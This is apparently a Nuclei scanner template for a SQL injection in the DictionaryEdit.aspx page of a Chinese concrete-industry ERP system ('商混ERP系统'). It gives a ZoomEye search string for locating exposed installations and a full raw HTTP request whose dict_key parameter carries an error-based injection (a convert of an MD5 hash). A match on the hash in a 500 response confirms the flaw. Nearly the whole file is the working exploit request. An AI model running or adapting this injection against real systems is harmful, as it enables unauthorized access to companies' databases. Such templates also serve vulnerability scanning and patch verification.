id: shanghun-erp-sqli

info:
  name: 商混ERP系统 DictionaryEdit.aspx SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: ZoomEye:app:"商混ERP系统"
      混凝土行业专用ERP平台 DictionaryEdit.aspx 页面存在可利用的SQL注入缺陷。
      该系统作为混凝土生产企业综合管理解决方案，集成生产调度、供应链管理及财务核算等核心模块。
  tags: 商混ERP

http:
- raw:
  - |
    GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)),3,32))-- HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - 'e10adc3949b'
